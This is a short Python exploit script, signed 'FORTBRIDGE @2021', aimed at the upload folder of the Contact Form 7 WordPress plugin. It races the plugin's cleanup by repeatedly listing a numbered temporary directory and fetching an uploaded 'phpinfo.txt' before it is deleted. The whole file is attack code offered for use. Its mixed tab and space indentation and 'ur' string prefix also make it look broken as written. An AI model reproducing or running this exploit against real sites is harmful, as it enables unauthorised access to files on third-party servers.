import requests 
import re
import sys
from threading import Thread

class Race(Thread):
    def __init__(self, url):
        Thread.__init__(self)
        self.url = url
 
 
    def run(self):
        while(1):
        	output = requests.get(self.url)
        	# GET the DIR
		pattern = re.compile(ur'href=\"([0-9]+)/"')
		res = pattern.search(output.text)
		#print(output.status_code)
		if not res:
			continue
		dir = res.group(1)
		#print(dir)
		print(".")
		output = requests.get(self.url + "/" + dir +"/phpinfo.txt" )
		print(output.status_code)

        	
if __name__ == '__main__':
	if len(sys.argv) != 2:
        	print("FORTBRIDGE @2021")
	        print("Usage: exploit.py wpcf6_uploads_url")
	        exit()

	r = Race(sys.argv[1])
	r.start()
	r.join()

